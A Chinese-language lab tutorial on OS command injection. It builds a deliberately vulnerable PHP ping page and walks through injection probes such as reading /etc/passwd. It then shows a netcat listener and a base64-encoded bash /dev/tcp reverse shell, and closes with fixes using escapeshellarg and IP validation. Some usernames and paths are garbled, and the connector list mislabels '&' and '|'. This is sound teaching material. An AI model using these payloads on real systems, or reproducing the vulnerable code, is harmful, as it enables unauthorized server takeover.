## 1、教学目标

1. 理解原理：解释 OS 命令注入漏洞（Command Injection）的成因。  
2. 识别漏洞：利用 Linux 命令连接符（如 `;`、`|`、`&&`）发现潜在注入点。  
3. 漏洞利用：掌握 Netcat（nc）的使用，能够构建并执行反弹 Shell（Reverse Shell）获取服务器权限。  
4. 防御修复：掌握 `escapeshellarg()` 和输入验证等防御手段。
---
## 2、实验环境搭建

### ①场景背景
某企业的 IT 部门为了方便检测内部服务器的连通性，开发了一个简易的网页工具“网络连通性检测终端”。由于开发人员缺乏安全意识，该工具未对用户输入进行过滤，直接调用了系统底层的 ping 命令。
### ②部署步骤

1. 启动 Web 服务  
   在kali终端输入：`sudo service apache2 start`
2. 创建漏洞环境：
   创建文件 /var/www/html/ping.php ，并将以下代码写入（需 root 权限）：
`<?php`
`error_reporting(E_ALL);`
`ini_set('display_errors', 1);`
`$output = "";`
`if (isset($_POST['ip'])) {`
    `$target = $_POST['ip'];`
    `// 【漏洞核心】直接拼接用户输入`
    `$cmd = "ping -c 4 " . $target;`
    `$output = shell_exec($cmd);`
`}`
`?>`
`<!DOCTYPE html>`
`<html lang="zh-CN">`
`<head>`
`<meta charset="UTF-8">`
`<title>IT 部内部工具-网络检测</title>`
`<style>`
`body {background:#222;color:#0f0;font-family:'Courier New',monospace;padding:40px;}`
`.terminal {border:2px solid #0f0;padding:20px;max-width:800px;margin:0 auto;box-shadow:0 0 15px #0f0;}`
`input[type="text"]{background:#000;border:1px solid #555;color:#fff;padding:5px;width:60%;}`
`input[type="submit"]{background:#0f0;border:none;color:#000;padding:5px 15px;cursor:pointer;font-weight:bold;}`
`pre {background:#111;padding:10px;border-left:3px solid #0f0;white-space:pre-wrap;}`
`</style>`
`</head>`
`<body>`
`<div class="terminal">`
  `<h2>System Network Utility v1.0</h2>`
  `<form method="post">`
    `<label>[root@server ~]# ping -c 4 </label>`
    `<input type="text" name="ip" placeholder="输入 IP 地址..." autocomplete="off">`
    `<input type="submit" value="Execute">`
  `</form>`
  `<?php if (!empty($output)): ?>`
  `<br><strong>>_ Execution Output:</strong>`
  `<pre><?php echo htmlspecialchars($output); ?></pre>`
  `<?php endif; ?>`
`</div>`
`</body>`
`</html>`
**注意**：复制的时候可能会出错，例如www变成w  ，/变成空格，//变成/等等。
3. 访问页面：
   打开浏览器访问 http: 靶机IP/ping.php ，确认页面加载正常。
## 3、攻击实战演练

   ### 第一阶段：功能测试与漏洞探测
   任务：确认输入框是否存在命令注入可能。
1. 正常测试：
   输入：127.0.0.1
   结果：页面返回 4 次 ping 的结果。
   分析：后端执行了 ping -c 4 127.0.0.1 。
2.  注入测试（利用分号）：
    输入：127.0.0.1; whoami
    结果：在 ping 结果之后，显示了 www -data 。
    原理： ; 是 Linux 命令连接符，表示“执行完前一个命令，无论成功失败，继续执行后一个”。
    后端实际执行： ping -c 4 127.0.0.1; whoami
**知识点：常用连接符**
; -> 顺序执行 (最常用)
| -> 管道符 (上一条的输出作为下一条的输入)
& -> 逻辑与 (上一条成功才执行下一条)
| -> 逻辑或 (上一条失败才执行下一条)
### 第二阶段：信息搜集 
任务：利用简单的命令查看服务器敏感信息。
1. 查看当前目录文件：
   输入： 127.0.0.1; ls -la
2. 读取系统用户列表：
   输入：127.0.0.1; cat /etc/passwd
3. 查看网络配置：
   输入：127.0.0.1; ip addr
### 第三阶段：获取系统权限 —— 核心环节
任务：将网页的简单交互转化为持续的终端控制权（反弹 Shell）。
#### 步骤 1：攻击机监听
在 Kali 终端打开一个新的标签页，启动 Netcat 监听：`nc -lvnp 4444`
- -l : 监听模式
- -v : 显示详细信息
- -n : 不进行 DNS 解析 (加快速度)
- -p : 指定端口
#### 步骤 2：构造 Payload (利用 Base64 编码绕过)
由于浏览器或 PHP shell_exec 可能会截断 & 、 > 等特殊字符，直接发送反弹命令往往会失败。我们采用 Base64 编码法。
`bash -i >& /dev/tcp/192.168.88.137/4444 0>&1`或`bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`
1. 生成编码命令 (在 Kali 终端执行)：
   将以下命令中的 IP 改为你的 Kali IP (eth0 的 IP)：
   echo "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" | base64
   假设生成的编码为： YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxCg=
2. 执行攻击 (在网页输入框)：
   输入以下内容并提交：
   `127.0.0.1; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxCg= " | base64 -d | bash`
#### 步骤 3：验证权限
回到正在运行 nc -lvnp 4444 的终端。如果看到光标闪烁或出现终端提示符：
`connect to \[127.0.0.1] from (UNKNOWN) \[127.0.0.1] 56789`
`w -data@kali:/var/w /html$`
==恭喜！你已经成功拿下了这台服务器的 Shell。==
## 4、漏洞原理分析
### 为什么会发生注入？
PHP 代码中的这一行是万恶之源：
`$cmd = shell_exec( "ping -c 4 " . $target );`
程序原本期望 $target 只是一个 IP 地址（如 8.8.8.8 ），但因为它是一个字符串拼接操作，且没有经过任何过滤，用户输入的内容被原样送给了 Linux 的Shell（Bash/Dash）。Shell 看到分号 ; 就会认为这是两个独立的命令，从而依次执行。
### 权限说明
拿到的 Shell 权限是 w -data 。这是 Apache 服务的默认用户。虽然它不是 root，但足以读取网站源代码、修改网页内容，甚至作为跳板攻击内网其他机器。
## 5、 修复与防御
### 方案 A：使用 escapeshellarg() (推荐)
PHP 提供了一个专门的函数，将用户的输入转义为“单纯的字符串参数”。
`$target = $_POST['ip'];`
`//任何特殊符号（如 ; & |）都会被转义，失去命令执行能力`
`$safe_target = escapeshellarg($target);`
`$cmd = shell_exec("ping -c 4 " . $safe_target);`
### 方案 B：严格的白名单验证
如果是 IP 地址，应该验证它是否符合 IP 格式。
`$target = $_POST['ip'];`
`if (filter_var($target, FILTER_VALIDATE_IP)) {`
   `$cmd = shell_exec("ping -c 4 " . $target);`
   `} else {`
     `die("非法输入！");`
`}`